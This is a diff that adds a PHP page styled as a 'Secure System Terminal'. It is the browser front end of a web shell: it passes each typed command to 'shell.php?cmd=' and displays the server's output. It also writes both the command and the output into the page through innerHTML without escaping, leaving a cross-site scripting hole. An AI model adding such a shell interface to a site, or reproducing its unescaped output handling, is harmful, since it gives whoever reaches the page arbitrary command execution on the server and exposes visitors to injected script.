@@ -1,0 +1,102 @@
+<?php
+header('Content-Type: text/html');
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Access Terminal</title>
+    <style>
+        body { 
+            background: #1e1e1e; 
+            color: #00ff00; 
+            font-family: monospace; 
+            padding: 20px; 
+            margin: 0;
+        }
+        .terminal { 
+            white-space: pre-wrap; 
+            margin-bottom: 10px;
+        }
+        .prompt {
+            color: #00ff00;
+            margin-right: 5px;
+        }
+        .command-line {
+            display: flex;
+            align-items: center;
+        }
+        input { 
+            background: transparent; 
+            color: #00ff00; 
+            border: none; 
+            font-family: monospace;
+            font-size: 16px;
+            flex-grow: 1;
+        }
+        input:focus { 
+            outline: none; 
+        }
+        .output {
+            color: #00ff00;
+            margin-top: 5px;
+            padding-left: 15px;
+        }
+        .error {
+            color: #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        === Secure System Terminal ===
+        Type 'help' for available commands
+    </div>
+    <div class="command-line">
+        <span class="prompt">mr_badger@server:~$</span>
+        <input type="text" id="command" autofocus>
+    </div>
+    <div id="output" class="terminal"></div>
+
+    <script>
+        const commandHistory = [];
+        let historyIndex = -1;
+
+        document.getElementById('command').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const cmd = this.value.trim();
+                if (cmd) {
+                    executeCommand(cmd);
+                    commandHistory.push(cmd);
+                    historyIndex = commandHistory.length;
+                    this.value = '';
+                }
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    this.value = commandHistory[historyIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex < commandHistory.length - 1) {
+                    historyIndex++;
+                    this.value = commandHistory[historyIndex];
+                }
+            }
+        });
+
+        async function executeCommand(cmd) {
+            const outputDiv = document.getElementById('output');
+            outputDiv.innerHTML += `<div class="command-line"><span class="prompt">mr_badger@server:~$</span> ${cmd}</div>`;
+            
+            try {
+                const response = await fetch(`shell.php?cmd=${encodeURIComponent(cmd)}`);
+                const text = await response.text();
+                outputDiv.innerHTML += `<div class="output">${text}</div>`;
+            } catch (error) {
+                outputDiv.innerHTML += `<div class="error">${error.message}</div>`;
+            }
+        }
+    </script>
+</body>
+</html> 
